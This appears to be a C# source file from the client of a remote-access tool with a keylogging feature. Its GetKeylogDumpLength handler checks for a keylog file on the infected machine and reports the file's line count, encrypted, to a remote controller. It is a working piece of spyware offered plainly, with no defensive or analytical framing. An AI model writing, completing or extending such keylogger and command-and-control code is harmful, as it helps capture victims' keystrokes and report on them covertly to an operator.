using Client.Config;
using Client.Core.Networking;
using Client.Core.Security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class GetKeylogDumpLength
    {
        public static void Execute(string data)
        {
            string fullFilePath = Path.Combine(Settings.KEYLOG_ROOT_PATH, Settings.KEYLOG_SUB_PATH, Settings.KEYLOG_FILE_NAME);
            if (File.Exists(fullFilePath))
            {
                if (NetworkManager.IsConnected)
                {
                    NetworkManager.Connection.SendObject("1x20",
                        Cryptography.Encrypt(JsonConvert.SerializeObject(File.ReadLines(fullFilePath).Count())));
                }
                else
                {
                    //TODO, Buffer / Packet queue of some sort
                }

            }
            else
            {
                //NO FILE
                if (NetworkManager.IsConnected)
                {
                    NetworkManager.Connection.SendObject("1x20",
                        Cryptography.Encrypt(JsonConvert.SerializeObject(0)));
                }
                else
                {
                    //TODO, Buffer / Packet queue of some sort
                }
            }
        }
    }
}
